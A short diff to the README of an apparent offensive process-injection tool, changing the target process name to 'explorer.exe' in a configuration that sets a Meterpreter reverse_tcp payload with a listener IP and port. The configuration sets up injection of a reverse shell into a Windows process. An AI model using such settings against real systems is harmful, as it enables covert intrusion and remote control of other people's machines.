@@ -14,7 +14,7 @@
 ### Static Variables 
 | Variables | Description |
 | --- | --- |
-| PROCESS_TO_INJECT | Contains the process names that you want to inject into|
+| PROCESS_TO_INJECT | Contains the process name that you want to inject into|
 | MSFVENOM_PAYLOAD | MSF Payload |
 | LHOST | Listener IP |
 | LPORT | Listener Port | 
@@ -22,7 +22,7 @@
 ```
 #!/bin/bash
 ...
-PROCESS_TO_INJECT="EXPLORER.EXE"
+PROCESS_TO_INJECT="explorer.exe"
 MSFVENOM_PAYLOAD="windows/x64/meterpreter/reverse_tcp"
 LHOST="192.168.100.128"
 LPORT=443
